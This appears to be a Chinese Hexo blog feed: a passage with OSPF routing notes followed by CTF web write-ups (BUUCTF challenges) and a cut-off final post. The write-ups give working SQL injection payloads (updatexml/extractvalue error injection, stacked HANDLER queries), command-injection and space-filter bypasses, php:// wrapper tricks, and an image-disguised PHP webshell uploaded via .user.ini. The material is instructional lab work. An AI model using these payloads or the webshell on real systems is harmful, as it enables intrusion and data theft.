href="#OSPF支持的五种网络类型" class="headerlink" title="OSPF支持的五种网络类型"></a>OSPF支持的五种网络类型</h2><table><thead><tr><th>网络类型</th><th>网络工作原理</th><th>建立邻居关系</th><th>默认网络类型</th><th>发送报文</th><th>选举DR/BDR</th><th>hello时间</th></tr></thead><tbody><tr><td>BMA类型（广播，Broadcast）</td><td>广播和多播</td><td>自动建立邻居</td><td>链路层协议为Ethernet或FDDI时，OSPF认为网络类型为广播</td><td>以组播形式发送Hello报文、LSU报文和LSAck报文。以单播形式发送DD报文和LSR报文。</td><td>需要</td><td>10s</td></tr><tr><td>NBMA类型（非广播多路访问，Non-Broadcast Multi-Access）</td><td>网络本身不支持广播功能，当链路层协议是帧中继或X.25时，OSPF缺省认为网络类型是NBMA</td><td>邻居需手动指定</td><td>当链路层协议是帧中继、X.25或ATM时，OSPF缺省认为网络类型是NBMA。</td><td>以单播形式发送协议报文（Hello报文、DD报文、LSR报文、LSU报文、LSAck报文）。</td><td>需要</td><td>30s</td></tr><tr><td>P2P类型（点到点，，Point-to-Point）</td><td>广播和多播</td><td>自动建立邻居</td><td>链路层协议是PPP或HDLC或LAPB，为P2P</td><td>以组播形式（224.0.0.5）发送协议报文（Hello报文、DD报文、LSR报文、LSU报文、LSAck报文）。</td><td>不需要</td><td>10s</td></tr><tr><td>P2MP类型（点到多点，Point-to-Multipoint）</td><td>广播和多播</td><td>自动建立邻居</td><td>没有一种链路层协议会被缺省的认为是P2MP类型，必须是由其他的网络类型<strong>强制更改</strong>的</td><td>以组播形式（224.0.0.5）发送Hello报文。以单播形式发送其他协议报文（DD报文、LSR报文、LSU报文、LSAck报文）。</td><td>不需要</td><td>30s</td></tr><tr><td>P2MPNB类型（点到多点非广播，Point-to-multipoint nonbroadcast）</td><td>不支持广播和多播</td><td>邻居需手动指定</td><td></td><td>单播发送</td><td>不需要</td><td>30s</td></tr></tbody></table><h2 id="Router-id选举："><a href="#Router-id选举：" class="headerlink" title="Router-id选举："></a>Router-id选举：</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">无环回接口，物理接口ip地址最大的为Router-id</span></span><br><span class="line"><span class="string">有环回接口，环回接口ip地址最大的为Router-id</span></span><br></pre></td></tr></table></figure><h3 id="换Router-id"><a href="#换Router-id" class="headerlink" title="换Router-id"></a>换Router-id</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">router-id</span> <span class="string">x.x.x.x</span></span><br><span class="line"><span class="string">clear</span> <span class="string">ip</span> <span class="string">ospf</span> <span class="string">process</span></span><br></pre></td></tr></table></figure><h2 id="Dr和BDr选举："><a href="#Dr和BDr选举：" class="headerlink" title="Dr和BDr选举："></a>Dr和BDr选举：</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">！！！路由器接口的优先级</span></span><br><span class="line"><span class="string">先看优先级，优先级高的（大优先）是Dr</span></span><br><span class="line"><span class="string">优先级相同时，网段上Router-id最大的路由器被选举为Dr，第二大的被选举为BDr</span></span><br><span class="line"><span class="string">优先级为0，不参与Dr/BDr选举</span></span><br></pre></td></tr></table></figure><h2 id="OSPF组播地址"><a href="#OSPF组播地址" class="headerlink" title="OSPF组播地址"></a>OSPF组播地址</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">224.0</span><span class="number">.0</span><span class="number">.5</span><span class="string">--DRother</span></span><br><span class="line"><span class="number">224.0</span><span class="number">.0</span><span class="number">.6</span><span class="string">--Dr/BDr</span></span><br></pre></td></tr></table></figure><h2 id="OSPF接口七种状态"><a href="#OSPF接口七种状态" class="headerlink" title="OSPF接口七种状态"></a>OSPF接口七种状态</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Down：接口的初始状态。表明此时接口不可用，不能用于收发流量。</span></span><br><span class="line"></span><br><span class="line"><span class="string">Loopback：设备到网络的接口处于环回状态。环回接口不能用于正常的数据传输，但可以通过Router-LSA进行通告。因此，进行连通性测试时能够发现到达这个接口的路径。</span></span><br><span class="line"></span><br><span class="line"><span class="string">Waiting：设备正在判定网络上的DR和BDR。在设备参与DR和BDR选举前，接口上会启动Waiting定时器。在这个定时器超时前，设备发送的Hello报文不包含DR和BDR信息，设备不能被选举为DR或BDR。这样可以避免不必要地改变链路中已存在的DR和BDR。仅NBMA网络、广播网络有此状态。</span></span><br><span class="line"></span><br><span class="line"><span class="string">P-2-P：接口连接到物理点对点网络或者是虚拟链路，这个时候设备会与链路连接的另一端设备建立邻接关系。仅P2P、P2MP网络有此状态。</span></span><br><span class="line"></span><br><span class="line"><span class="string">DROther：设备没有被选为DR或BDR，但连接到广播网络或NBMA网络上的其他设备被选举为DR。它会与DR和BDR建立邻接关系。</span></span><br><span class="line"></span><br><span class="line"><span class="string">BDR：设备是相连的网络中的BDR，并将在当前的DR失效时成为DR。该设备与接入该网络的所有其他设备建立邻接关系。</span></span><br><span class="line"></span><br><span class="line"><span class="string">DR：设备是相连的网络中的DR。该设备与接入该网络的所有其他设备建立邻接关系。</span></span><br></pre></td></tr></table></figure><h2 id="OSPF邻居八种状态："><a href="#OSPF邻居八种状态：" class="headerlink" title="OSPF邻居八种状态："></a>OSPF邻居八种状态：</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">down</span> <span class="string">没有收到任何ospf报文，只会发送Hello报文</span></span><br><span class="line"></span><br><span class="line"><span class="string">Attempt</span><span class="string">此状态只在NBMA网络上存在，表示没有收到邻居的任何信息，但是已周期性的向邻居发送报文</span></span><br><span class="line"></span><br><span class="line"><span class="string">Init</span> <span class="string">表示接收到了邻居的Hello报文，但是报文中没有我的信息（如router</span> <span class="string">ID），（对方没有收到我发的Hello报文），开始发送Hello包</span></span><br><span class="line"></span><br><span class="line"><span class="string">2way</span> <span class="string">邻接状态，双方互相收到Hello报文，在接收的hello包中包含了自己的路由ID，邻居关系才能init进入2way</span></span><br><span class="line"></span><br><span class="line"><span class="string">Exstart</span> <span class="string">预启动状态，在多路访问环境（广播型、NBMA）需要选举DR和BDR，建立主从关系，选举成功后才能进入exstart状态</span></span><br><span class="line"></span><br><span class="line"><span class="string">Exchange</span> <span class="string">路由器将本地的LSDB用DD报文来描述，并发送给邻居。在exstart状态中，点到点、点到多点网络类型中选择的master和slave，由master首先更新DBD</span></span><br><span class="line"></span><br><span class="line"><span class="string">Loading</span><span class="string">路由器发送LSR报文向邻居请求对方的DD报文，就是交互DBD</span></span><br><span class="line"></span><br><span class="line"><span class="string">FULL</span> <span class="string">链路状态数据库完全同步，本路由器和邻居建立了邻接状态，完全邻接</span></span><br></pre></td></tr></table></figure><h2 id="OSPF的LSA"><a href="#OSPF的LSA" class="headerlink" title="OSPF的LSA"></a>OSPF的LSA</h2><p>11种LSA</p><table><thead><tr><th>LSA类型</th><th>LSA作用</th></tr></thead><tbody><tr><td>Router-LSA（Type1）路由器LSA</td><td>每个路由器都会产生，描述了路由器的链路状态和开销，在发布路由器所属的区域内传播</td></tr><tr><td>Network-LSA（Type2）网络LSA</td><td>由DR产生，描述本网段的链路状态，在DR所属的区域内传播。</td></tr><tr><td>Network-summary-LSA（Type3）网络汇总LSA</td><td>由ABR产生，描述区域内某个网段的路由，并通告发布或接收此LSA的非Totally Stub或NSSA区域。直接传递路由条目，而不是链路状态描述</td></tr><tr><td>ASBR-summary-LSA（Type4）自治系统边界路由器 汇总LSA</td><td>由ABR产生，描述本区域到其他区域中的ASBR的路由，通告给除ASBR所在区域的其他区域。</td></tr><tr><td>AS-external-LSA（Type5）自治系统外部LSA</td><td>由ASBR产生，描述到AS外部的路由，通告到所有的区域（除了Stub区域和NSSA区域）。直接传递路由条目，而不是链路状态描述</td></tr><tr><td>Group-membership-LSA（Type6）</td><td>用于组播，不做讨论</td></tr><tr><td>NSSA LSA（Type7）</td><td>由ASBR产生，描述到AS外部的路由，仅在NSSA区域内传播</td></tr><tr><td>Opaque LSA（Type9、Type10、Type11）</td><td>Opaque LSA提供用于OSPF的扩展的通用机制。其中：Type9 LSA仅在接口所在网段范围内传播。用于支持GR的Grace LSA就是Type9 LSA的一种。Type10 LSA在区域内传播。用于支持TE的LSA就是Type10 LSA的一种。Type11 LSA在自治域内传播，目前还没有实际应用的例子。</td></tr></tbody></table><h2 id="OSPF区域类型"><a href="#OSPF区域类型" class="headerlink" title="OSPF区域类型"></a>OSPF区域类型</h2><table><thead><tr><th>区域类型</th><th>作用</th></tr></thead><tbody><tr><td>骨干区域 Backbone area(area 0)</td><td>area 0在OSPF网络中起着中心节点的作用，其他区域的链路信息通过area 0来进行相互传递，这也意味着所有其他区域都必须跟area0相连。</td></tr><tr><td>标准区域 Standard area</td><td>标准区域的意思就是在这个区域里面可以正常传递OSPF各类报文。该区域支持1、2、3、4、5类LSA。</td></tr><tr><td>末节区域 Stub area</td><td>该区域不接受非OSPF网络的任何外部路由（external route），它如果要到达那些外部路由的时候，只需要通过默认路由把它发出去就可以了。该区域支持1、2、3类LSA。</td></tr><tr><td>完全末节区域 Totally stubby area</td><td>该区域非但不接受外部路由，也不接受自己本区域以外的其他区域的链路信息。它如果要到达本区域以外的目标网络的时候，也是跟末节区域一样，直接把报文通过默认路由发出去。这里要注意的是，由于默认路由是用3类LSA发送的，所以完全末节区域虽然不允许普通的3类LSA报文，但是支持这种包含默认路由的3类LSA。该区域支持1、2类LSA，以及包含默认路由的3类LSA。</td></tr><tr><td>非纯末节区域 No so stubby area(NSSA)</td><td>在含有stub区域的条件下，还拥有可以发送外部路由出去给其他区域的能力。该区域支持1、2、3、7类LSA。这里注意一点的是，NSSA区域还有另外一种模式，那就是是完全末节区域模式的NSSA。这个模式其实就是在完全末节区域环境下允许引入外部路由，这种区域模式支持1、2类LSA以及包含默认路由的3类LSA。</td></tr><tr><td>完全非纯末梢区域 Totally NSSA</td><td>不接受外部路由和来自其他区域的汇总路由，该区域不接受 LSA 3 / 4 / 5，但有 LSA 7，使用默认路由前往区域外的网络。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> IGP </category>
          
          <category> ospf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ospf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xpath报错注入</title>
      <link href="/2021/07/29/xpath%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/29/xpath%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>第一次知道还可以这样注入，拿题目来讲</p><h3 id="进行常规的注入，然后发现都不行，回显页面都一样"><a href="#进行常规的注入，然后发现都不行，回显页面都一样" class="headerlink" title="进行常规的注入，然后发现都不行，回显页面都一样"></a>进行常规的注入，然后发现都不行，回显页面都一样</h3><p>看别人wp才知道xpath报错注入</p><p>使用 extractvalue 和 updatexml 进行报错注入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">extractvalaue(1,concat(0x7e,执行语句))</span></span><br><span class="line"><span class="attr">tip:</span> <span class="string">还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串，substr()下标是以1开始，不是以0开始</span></span><br><span class="line"></span><br><span class="line"><span class="string">updatexml(1,concat(0x7e,执行语句),1)</span></span><br></pre></td></tr></table></figure><p>先写payload：?username=1&amp;password=1’or updatexml(1,concat(0x7e,database(),0x7e),1) %23   这样不行，空格被过滤了</p><p>空格用()代替</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">使用updatexml</span></span><br><span class="line"><span class="string">payload：?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</span>   </span><br><span class="line"></span><br><span class="line"><span class="string">使用extractvalue</span></span><br><span class="line"><span class="string">payload：?username=1&amp;password=1&#x27;or(extractvalue(1,concat(0x7e,(select(database())))))%23</span></span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">还可以使用</span> <span class="string">^</span> <span class="string">来连接函数</span></span><br><span class="line"></span><br><span class="line"><span class="string">payload：?username=1&amp;password=1&#x27;^updatexml(1,concat(0x7e,(select(database()))),1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="string">payload：?username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span></span><br></pre></td></tr></table></figure><p>查到当前数据库为geek</p><p>接下来常规操作<br>查所有的数据库</p><h3 id="1-查库"><a href="#1-查库" class="headerlink" title="1.查库"></a>1.查库</h3><p>​    ?username=1&amp;password=1’^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))),1)%23</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))%23</span></span><br></pre></td></tr></table></figure><p>查到的数据库有’~information_schema,mysql,perfor’，因为函数字符串只显示32位，看不到全部的，没啥信息，那么应该在当前数据库geek里面</p><h3 id="2-查表，在geek的"><a href="#2-查表，在geek的" class="headerlink" title="2.查表，在geek的"></a>2.查表，在geek的</h3><p>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=’geek’))))%23<br>  发现=被过滤了<br>  用like代替<br>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23</p><p>查询到表为’~H4rDsq1’</p><h3 id="3-查字段有哪些"><a href="#3-查字段有哪些" class="headerlink" title="3.查字段有哪些"></a>3.查字段有哪些</h3><p>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23</p><p>字段内容’~id,username,password’</p><h3 id="4-查字段内容，爆数据"><a href="#4-查字段内容，爆数据" class="headerlink" title="4.查字段内容，爆数据"></a>4.查字段内容，爆数据</h3><p>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23<br>  ‘~flag{366724b1-b4ee-464b-ae5d-15’<br>  因为函数只显示32位字符</p><p>  使用截取函数<br>  截取函数：left(arg,length) right(arg,length)<br>  两个MySQL函数分别从左、右边返回length长度的字符串</p><p>  还有substr(arg,start,length)，length不写默认到末尾<br>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(substr(password,1))from(geek.H4rDsq1))))%23<br>  substr被过滤了</p><p>  使用另外两个<br>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(left(password,31))from(geek.H4rDsq1))))%23<br>  ‘~flag{366724b1-b4ee-464b-ae5d-15’</p><p>  ?username=1&amp;password=1’^extractvalue(1,concat(0x7e,(select(right(password,31))from(geek.H4rDsq1))))%23<br>  ‘~b1-b4ee-464b-ae5d-1520e7cb646e}’</p><p>  把flag拼接一下<br>  flag{366724b1-b4ee-464b-ae5d-1520e7cb646e}</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xpath注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2021/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行（Command-Execution）漏洞"><a href="#命令执行（Command-Execution）漏洞" class="headerlink" title="命令执行（Command Execution）漏洞"></a>命令执行（Command Execution）漏洞</h2><p>即可以直接再Web应用中执行系统命令，从而拿下shell权限</p><pre><code>造成原因可能是Web服务器对用户输入命令安全检测不足，导致恶意代码执行。常见的命令执行漏洞发生再各种Web组件，包括Web容器、Web框架、CMS软件、安全组件等</code></pre><p>应用程序有时需要调用一些系统命令的函数，如在php中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当控制这些函数参数时，就可以将恶意的系统命令拼接到正操命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><h3 id="命令执行漏洞攻击"><a href="#命令执行漏洞攻击" class="headerlink" title="命令执行漏洞攻击"></a>命令执行漏洞攻击</h3><pre><code>一些网页提供ping的功能，拿buu上的web题[ACTF2020 新生赛]Exec举例，这时一道命令执行漏洞题</code></pre><p>给参数target输入127.0.0.1时，程序会执行ping 127.0.0.1，然后将结果返回<br><img src="/img/web/rec/1.png"><br><img src="/img/web/rec/2.png"></p><p>如果将参数target设置为127.0.0.1|cat /flag<br>就可以看到结果<img src="/img/web/rec/3.png" title=" "></p><p>这里是利用了管道符“|”让系统执行了命令 cat /flag</p><h3 id="下面是常用的管道符。"><a href="#下面是常用的管道符。" class="headerlink" title="下面是常用的管道符。"></a>下面是常用的管道符。</h3><p>有的时候，管道符前后空格会被ban掉，能不加空格隔开就不加空格</p><h4 id="windows系统支持的管道符："><a href="#windows系统支持的管道符：" class="headerlink" title="windows系统支持的管道符："></a>windows系统支持的管道符：</h4><pre><code>&quot;|&quot;: 直接执行后面的语句。例如：ping 127.0.0.1|whoami&quot;||&quot;: 如果前面的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami&quot;&amp;&quot;: 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami&quot;&amp;&amp;&quot;: 如果前面的语句为假则直接退出，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami</code></pre><h4 id="linux系统支持的管道符："><a href="#linux系统支持的管道符：" class="headerlink" title="linux系统支持的管道符："></a>linux系统支持的管道符：</h4><pre><code>&quot;;&quot;: 执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami&quot;|&quot;: 显示后面语句的执行结果。例如：ping 127.0.0.1|whoami&quot;||&quot;: 当前语句执行出错时，执行后面的语句。例如：ping 1||whoami&quot;&amp;&quot;: 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami&quot;&amp;&amp;&quot;: 如果前面的语句为假则直接出错，也不执行后面的。例如：ping 127.0.0.1&amp;&amp;whoami</code></pre><h3 id="命令执行漏洞代码分析"><a href="#命令执行漏洞代码分析" class="headerlink" title="命令执行漏洞代码分析"></a>命令执行漏洞代码分析</h3><p>服务器端处理ping代码假设如下，程序获取参数ip，然后拼接到system()函数中，利用该函数执行ping功能<br>但是没有对参数ip做过滤和检测，导致可以利用管道符执行其他的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;ping -n 2 &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><pre><code>尽量不使用命令执行函数客户端提交的变量做好过滤和检测</code></pre><h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p>内联，就是将反引号内命令的输出作为输入执行</p><pre><code>    ?ip=127.0.0.1;cat$IFS`ls`    ?ip=127.0.0.1;cat$IFS$3`ls`    ?ip=127.0.0.1;cat$IFS$9`ls`    ?ip=127.0.0.1|cat$IFS$9`ls`</code></pre><p>命令绕过空格方法有：</p><pre><code>    $&#123;IFS&#125;$9    &#123;IFS&#125;    $IFS    $&#123;IFS&#125;    $IFS$1 //$1改成$加其他数字貌似都行    IFS    &lt;     &lt;&gt;     &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来    %20   (space)    %09   (tab)    X=$&#39;cat\x09.\flag.php&#39;;$X       （\x09表示tab，也可以用\x20）</code></pre><p>有时会禁用cat:</p><p>解决方法是使用tac反向输出命令（内容从最后一行开始输出）：<br>实例：tac flag.txt</p><p>linux命令中可以加\，所以甚至可以ca\t \fl\ag</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> rec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> rec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buu_web刷题记录</title>
      <link href="/2021/07/16/buu_web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/16/buu_web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>先判断是啥注入，是字符型注入</p><p>然后判断字段数，两个字段，使用1’ union select 1,2 –+</p><p>发现过滤了select，回显内容如下</p><p>return preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p><p>可以看到show 没有过滤，使用show tables查看表；</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;--+</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="string">;show</span> <span class="string">columns</span> <span class="string">from</span> <span class="string">from</span> <span class="string">`FlagHere`;--+</span></span><br><span class="line"><span class="string">有flag字段</span></span><br><span class="line"><span class="string">看别人博客才知道有handler这个东西</span></span><br><span class="line"><span class="string">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</span></span><br></pre></td></tr></table></figure><h3 id="handler基本语法："><a href="#handler基本语法：" class="headerlink" title="handler基本语法："></a>handler基本语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler tbname open</span><br><span class="line">handler tbname read first</span><br><span class="line">handler tbname close</span><br></pre></td></tr></table></figure><ul><li>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</li><li>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</li><li>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</li><li>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">payload：?inject=1&#x27;;handler</span> <span class="string">FlagHere</span> <span class="string">open;handler</span> <span class="string">FlagHere</span> <span class="string">read</span> <span class="string">first;handler</span> <span class="string">FlagHere</span> <span class="string">close;</span> <span class="string">--+</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>文件上传题</p><p>不能直接上传木马，图片内容也会检查</p><p>使用.user.ini,上传这样的文件，内容为<br> <figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GIF89a</span> </span><br><span class="line"><span class="string">auto_prepend_file=shell.jpg</span></span><br></pre></td></tr></table></figure><br>没有GIF89a这个jpg伪装头，会出现exif_imagetype:not image! ，exif_imagetype()这个函数使用GIF89a绕过</p><p>然后上传shell.jpg这个木马，因为文件内容会检查，这样写<br>        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>然后蚁剑连接</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>看题，又是伪协议加序列化</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.先绕过第一个，传入一个文件内容为welcome</span> <span class="string">to</span> <span class="string">the</span> <span class="string">zjctf的文件名，只能上传一个这样内容的文件，但是怎么上传文件呢？</span></span><br><span class="line"><span class="string">使用php://input不行最后一步不行，使用data伪协议</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.两方法上传文件</span></span><br><span class="line">    <span class="number">1</span><span class="string">&gt;</span> <span class="string">php://input伪协议，以POST形式传入</span></span><br><span class="line">        <span class="string">/?text=php://input</span></span><br><span class="line"></span><br><span class="line">        <span class="string">welcome</span> <span class="string">to</span> <span class="string">the</span> <span class="string">zjctf</span></span><br><span class="line">    </span><br><span class="line">    <span class="number">2</span><span class="string">&gt;</span> <span class="string">data伪协议</span></span><br><span class="line">        <span class="string">?text=data:text/plain,welcome</span> <span class="string">to</span> <span class="string">the</span> <span class="string">zjctf</span></span><br><span class="line">        <span class="string">编码绕过：</span></span><br><span class="line">            <span class="string">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br><span class="line"></span><br><span class="line"><span class="string">这里我用php://input</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span><span class="string">.根据提示，读取useless.php,使用php://filter</span></span><br><span class="line">    <span class="attr">payload:</span> <span class="string">?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line">    <span class="attr">payload:</span> <span class="string">?text=data:text/plain,welcome</span> <span class="string">to</span> <span class="string">the</span> <span class="string">zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br><span class="line">    <span class="string">然后base64解密</span></span><br><span class="line">    <span class="string">得到源码：</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 